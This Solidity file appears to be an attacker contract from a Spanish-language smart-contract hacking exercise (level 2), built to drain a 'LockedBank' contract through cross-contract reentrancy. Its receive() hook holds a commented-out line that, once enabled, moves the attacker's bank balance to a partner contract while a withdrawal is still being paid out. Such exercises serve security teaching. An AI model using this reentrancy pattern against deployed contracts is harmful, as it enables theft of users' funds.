// SPDX-License-Identifier: MIT
pragma solidity 0.8.38;

import {LockedBank} from "../Level2.sol";

// ¿Qué? Tu atacante del nivel 2. Se despliegan dos y cada uno sabe cuál es el otro.
contract BankAttacker {
    LockedBank public immutable BANK;
    address public immutable PLAYER;
    BankAttacker public partner;

    constructor(LockedBank bank) {
        BANK = bank;
        PLAYER = msg.sender;
    }

    function setPartner(BankAttacker other) external {
        partner = other;
    }

    /// @notice Deposita lo que envías en el banco a nombre de este contrato.
    function deposit() external payable {
        BANK.deposit{value: msg.value}();
    }

    /// @notice Retira el saldo de este contrato en el banco.
    function withdraw() external {
        BANK.withdraw();
    }

    /// @notice Lleva el botín al jugador.
    function collect() external {
        (bool ok,) = PLAYER.call{value: address(this).balance}("");
        require(ok, "collect");
    }

    // PASO 3: mientras `withdraw` te envía el ETH, tu saldo en el banco sigue entero.
    // Descomenta la línea que empieza con `//> `. Sin ella, `receive` solo acepta el ETH.
    receive() external payable {
        //> BANK.transfer(address(partner), BANK.balanceOf(address(this)));
    }
}
